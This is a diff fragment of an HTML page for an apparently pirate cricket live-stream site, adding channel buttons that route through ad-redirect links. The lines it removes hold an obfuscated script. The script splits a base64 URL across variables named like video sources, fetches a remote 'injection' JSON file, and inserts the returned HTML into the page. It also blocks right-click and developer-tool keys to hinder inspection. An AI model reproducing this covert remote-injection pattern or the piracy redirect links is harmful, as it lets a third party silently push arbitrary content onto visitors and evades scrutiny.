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" height="100px" width="140px" border="4px" /></a><h4 style="text-align: center; color: green;margin: 5px;">Fox Cricket</h4></button>
+	
+	
+	
+	<a href="https://ytlive.tk/ads.html?id=https://stream.crichd.vip/update/willowcricket.php"><button class="button button2"> <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRN9u6p2FyfTIVssLeYRMgltrccjgJT0t-SSQ&usqp=CAU" height="100px" width="140px" border="4px" /></a><h4 style="text-align: center; color: green;margin: 5px;">Willow HD</h4></button>
 
 
 
-</div>        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script><script src="https://cdn.radiantmediatechs.com/rmp/5.9.2/js/rmp.min.js"></script><script>
-            var appSettings={
-                loaderimg: "",
-                name: " Zulfiqar TV",
-                poster: "https://i.postimg.cc/Pxg3nzz7/20221031-100719.jpg",
-                introMp4: "https://wasitv.pk/wasitv-intro.mp4",
-                introHls: "https://wasitv.pk/wasitv-intro/index.m3u8",
-				videoFormat: "mp4",
-            },x={loaderimg:appSettings.loaderimg,name:appSettings.name,poster:appSettings.poster,website:"",licenseKey:"Kl8lbz16cz1rN2l2enM9Z2M9NnZvMnllaT9yb201ZGFzaXMzMGRiMEElXyo",autoHeightMode:!0,pip:!1,autoplay:!1,skin:"s4",hideControls:!0,preload:"auto",sharing:!1},firstVideo="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlc";setInterval(()=>{$("#loader-image").attr("src",x.loaderimg),$(".logoText").html(x.name)},10),$(document).contextmenu(function(e){return e.preventDefault(),!1}),document.onkeydown=function(e){return 123!=event.keyCode&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="I".charCodeAt(0))&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="C".charCodeAt(0))&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="J".charCodeAt(0))&&((!e.ctrlKey||e.keyCode!="U".charCodeAt(0))&&void 0))))},setTimeout(()=>{$("#loader").css("display","none"),$("body").css("overflow","auto")},100);var src,secondVideo="mNvbnRlbnQuY29tL3NvZnR";$("span").each(function(e){$(this).on("click",function(){var e=$(this).attr("url");rmp.setControls(!0),src="hls"==appSettings.videoFormat?{hls:e}:{mp4:[e]},rmp.setSrc(src),rmp.play()})});var thirdVideo="3ZWJ0dXRzL015RHJpdmUvbW";src="hls"==appSettings.videoFormat?{hls:appSettings.introHls}:{mp4:[appSettings.introMp4]};var fourthVideo="Fpbi9pbmplY3Rpb24uanNvbg==",settings={licenseKey:x.licenseKey,autoHeightMode:x.autoHeightMode,pip:x.pip,delayToFade:3e3,gaLabel:"Live TV",logoWatermark:!0,logoPosition:"topleft",speed:"Speed",isLive:!0,googleCast:!0,airplay:!0,hlsJSMaxBufferLength:24,hlsJSLiveSyncDuration:18,hlsJSStartLevel:-1,hlsJSMinAutoBitrate:1e5,hlsJSAbrBandWidthFactor:.9,hlsJSAbrBandWidthUpFactor:.7,hlsJSLiveBackBufferLength:0,detectAutoplayCapabilities:!0,autoplay:x.autoplay,mutedAutoplayOnMobile:!1,mutedAutoplayOnMacosSafari11Plus:!1,srcChangeAutoplay:!0,playsInline:!0,skin:x.skin,skinBackgroundColor:"rgba(0, 0, 0, 0.7)",skinButtonColor:"FFFFFF",skinAccentColor:"FF0000",ads:!0,nav:!0,adBlockerDetection:!0,adEnablePreloading:!0,adBlockerDetectedMessage:"Ad-blocker software detected. Please disable Ad-blocker to watch stream.",quickRewind:10,quickForward:10,adAutoAlign:!1,hideControls:x.hideControls,preload:x.preload,crossorigin:!0,sharing:x.sharing,sharingUrl:x.website,contentMetadata:{artwork:[{src:x.poster,sizes:"1280x720",type:"image/jpg"}],poster:[x.poster],endOfVideoPoster:[x.poster],thumbnail:x.poster},src:src},elementID="rmpPlayer",rmp=new RadiantMP(elementID),rmpContainer=document.getElementById(elementID);rmp.setLoop(!0),rmp.init(settings),$(function(){$(window).scroll(function e(){return $("#rmpPlayer").css($(window).scrollTop()>1?{position:"fixed",top:"0px"}:{position:"relative",top:"auto"}),$("#buttons-list").css($(window).scrollTop()>1?{"margin-top":$("#rmpPlayer").height()}:{"margin-top":"0px"}),e}())});const request=async e=>{const t=await fetch(e);return await t.json()};navigator.onLine&&request(atob(firstVideo+secondVideo+thirdVideo+fourthVideo)).then(t=>{1==t.inject&&document.querySelector("div").insertAdjacentHTML("afterend",e.content)}).catch(e=>{console.log(appSettings.name)});</script>
+<a href="https://jk3lz82elw79-hls-live.5centscdn.com/GeoSuper/074de7e7c226d5c60f8af14c20725352.sdp/playlist.m3u8"><button class="button button2"> <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSXQeSJZYyMIkl4A5cDRFWmxe3VRpDkjOqJgw&usqp=CAU" height="100px" width="140px" border="4px" /></a><h4 style="text-align: center; color: green;margin: 5px;">Geo Super</h4></button>
 
-</body></html>
+
+
+<a href="https://ytlive.tk/ads.html?id=https://stream.crichd.vip/update/tensp.php"><button class="button button2"> <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHzk6Rgd40ne4c0eaFNou_2zyPHQ_kqwjCZQ&usqp=CAU" height="100px" width="140px" border="4px" /></a><h4 style="text-align: center; color: green;margin: 5px;">Ten Sports</h4></button>
+
+
+<a href="https://ytlive.tk/ads.html?id=https://stream.crichd.vip/update/star.php"><button class="button button2"> <img src="https://mir-s3-cdn-cf.behance.net/project_modules/disp/b2f3a318133289.5ada7a7233f6e.jpg" height="100px" width="140px" border="4px" /></a><h4 style="text-align: center; color: green;margin: 5px;">Star Sports</h4></button>
+
+
+
+<a href="https://ytlive.tk/ads.html?id=https://stream.crichd.vip/update/sscricket.php"><button class="button button2"> <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVnkbXt769CPKnH4Q6F7rEqsUCrI3xoXT_7A&usqp=CAU" height="100px" width="140px" border="4px" /></a><h4 style="text-align: center; color: green;margin: 5px;">Super Sports</h4></button>
+
+
+
+<a href="https://ytlive.tk/ads.html?id=https://stream.crichd.vip/update/skys2.php"><button class="button button2"> <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTIlgaDCpBpCIO9TfxbS5VADriIvlRrinUBNw&usqp=CAU" height="100px" width="140px" border="4px" /></a><h4 style="text-align: center; color: green;margin: 5px;">Sky Sports Cricket</h4></button>
+
+
+<a href="https://ytlive.tk/ads.html?id=https://stream.crichd.vip/update/star1hi.php"><button class="button button2"> <img src="https://www.themediaant.com/blog/wp-content/uploads/2022/02/STAR-SPORTS-1.jpg" height="100px" width="140px" border="4px" /></a><h4 style="text-align: center; color: green;margin: 5px;">Star Sports 1</h4></button>
+
+
+
+<a href="https://ytlive.tk/ads.html?id=https://stream.crichd.vip/update/willowextra.php"><button class="button button2"> <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTFJuqprDKG2OC9eWlotcX0FqbgCsj7zXDLTw&usqp=CAU" height="100px" width="140px" border="4px" /></a><h4 style="text-align: center; color: green;margin: 5px;">Willow Cricket Extra</h4></button>
+
+
